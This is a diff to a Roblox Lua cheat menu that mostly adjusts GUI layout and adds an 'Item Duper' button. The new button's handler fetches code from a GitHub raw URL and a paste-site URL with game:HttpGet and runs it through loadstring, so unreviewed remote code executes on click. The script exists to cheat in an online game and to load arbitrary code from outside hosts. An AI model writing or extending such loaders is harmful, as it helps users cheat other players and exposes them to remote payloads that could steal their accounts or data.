@@ -7,8 +7,8 @@ gui.ResetOnSpawn = false
 gui.Parent = player:WaitForChild("PlayerGui")
 
 local main = Instance.new("Frame")
-main.Size = UDim2.new(0, 420, 0, 340)
-main.Position = UDim2.new(0.5, -210, 0.5, -170)
+main.Size = UDim2.new(0, 420, 0, 380)
+main.Position = UDim2.new(0.5, -210, 0.5, -190)
 main.BackgroundColor3 = Color3.fromRGB(5, 5, 15)
 main.BorderSizePixel = 0
 main.Parent = gui
@@ -68,12 +68,12 @@ end)
 
 local function createButton(text, posX, posY, color, sizeX)
     local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(sizeX or 0.4, 0, 0, 65)
-    btn.Position = UDim2.new(posX, 0, posY, -30)
+    btn.Size = UDim2.new(sizeX or 0.4, 0, 0, 55)
+    btn.Position = UDim2.new(posX, 0, posY, -25)
     btn.BackgroundColor3 = color
     btn.Text = text
     btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 17
+    btn.TextSize = 16
     btn.TextColor3 = Color3.fromRGB(255,255,255)
     btn.BorderSizePixel = 0
     btn.Parent = main
@@ -87,11 +87,11 @@ local function createButton(text, posX, posY, color, sizeX)
     return btn
 end
 
-local oldBtn = createButton("Old (May not work)", 0.07, 0.35, Color3.fromRGB(170,40,40))
-local newBtn = createButton("New", 0.53, 0.35, Color3.fromRGB(0,120,255))
+local oldBtn = createButton("Old (May not work)", 0.07, 0.30, Color3.fromRGB(170,40,40))
+local newBtn = createButton("New", 0.53, 0.30, Color3.fromRGB(0,120,255))
 
 -- ZL BUTTON (Orange)
-local zlBtn = createButton("Execute ZL", 0.07, 0.62, Color3.fromRGB(255,140,0), 0.86)
+local zlBtn = createButton("Execute ZL", 0.07, 0.50, Color3.fromRGB(255,140,0), 0.86)
 
 zlBtn.MouseButton1Click:Connect(function()
     zlBtn.Text = "Loading..."
@@ -107,10 +107,33 @@ zlBtn.MouseButton1Click:Connect(function()
     gui:Destroy()
 end)
 
+-- ITEM DUPER BUTTON (Purple)
+local itemDuperBtn = createButton("Item Duper", 0.07, 0.68, Color3.fromRGB(147, 51, 234), 0.86)
+
+itemDuperBtn.MouseButton1Click:Connect(function()
+    itemDuperBtn.Text = "Loading..."
+
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/VoidZItemDuper/refs/heads/main/MainLoaders"))()
+        end)
+    end)
+
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://cdn.sourceb.in/bins/PYrVdKo7a2/0"))()
+        end)
+    end)
+
+    itemDuperBtn.Text = "Executed!"
+    task.wait(1)
+    gui:Destroy()
+end)
+
 -- DISCORD BUTTON
 local discordBtn = Instance.new("TextButton")
-discordBtn.Size = UDim2.new(0.86, 0, 0, 55)
-discordBtn.Position = UDim2.new(0.07, 0, 0.85, -20)
+discordBtn.Size = UDim2.new(0.86, 0, 0, 50)
+discordBtn.Position = UDim2.new(0.07, 0, 0.88, -20)
 discordBtn.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
 discordBtn.Text = "Copy Discord"
 discordBtn.Font = Enum.Font.GothamBold
